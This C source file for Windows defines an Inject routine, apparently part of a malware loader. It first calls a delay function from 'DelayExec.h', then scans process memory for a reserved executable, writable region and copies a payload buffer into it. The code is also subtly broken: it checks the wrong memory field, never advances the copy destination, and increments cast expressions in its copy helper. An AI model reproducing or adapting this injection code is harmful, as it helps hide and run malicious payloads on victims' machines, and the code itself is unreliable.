#include <Windows.h>
#include "DelayExec.h"

#define		PAGE_SIZE					4096
#define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )

VOID _Memcpy(_In_ PVOID Destination, _In_ PVOID Source, _In_ SIZE_T Length)
{
	while (Length--)
	{
		*((PBYTE)Destination)++ = *((PBYTE)Source)++;
	}
}

PVOID Inject(_In_ PVOID PayloadBuffer, _In_ SIZE_T PayloadSize)
{	
	if (PayloadBuffer == NULL)
	{
		return NULL;
	}

	DWORD					 NewSize = SET_TO_MULTIPLE_OF_4096(PayloadSize);
	MEMORY_BASIC_INFORMATION MemoryBasicInformation;
	PVOID					 StartAddress;
	
	Wait(FALSE);

	for (StartAddress = NULL; VirtualQuery(StartAddress, &MemoryBasicInformation, sizeof(MEMORY_BASIC_INFORMATION));
		StartAddress = (PVOID)((ULONG_PTR)StartAddress + MemoryBasicInformation.RegionSize))
	{
		if (MemoryBasicInformation.AllocationProtect == PAGE_EXECUTE_READWRITE
			&& MemoryBasicInformation.Protect == MEM_RESERVE
			&& MemoryBasicInformation.Type == MEM_PRIVATE
			&& MemoryBasicInformation.RegionSize == NewSize)
		{
			break;
		}
	}

	if (StartAddress == NULL)
	{
		return NULL;
	}

	PVOID TempAddress = StartAddress;

	for (DWORD i = 0; i < NewSize / PAGE_SIZE; i++)
	{	
		_Memcpy(StartAddress, PayloadBuffer, PAGE_SIZE);

		PayloadBuffer = (PBYTE)((ULONG_PTR)PayloadBuffer + PAGE_SIZE);
		TempAddress   = (PBYTE)((ULONG_PTR)StartAddress  + PAGE_SIZE);
	}

	return StartAddress;
}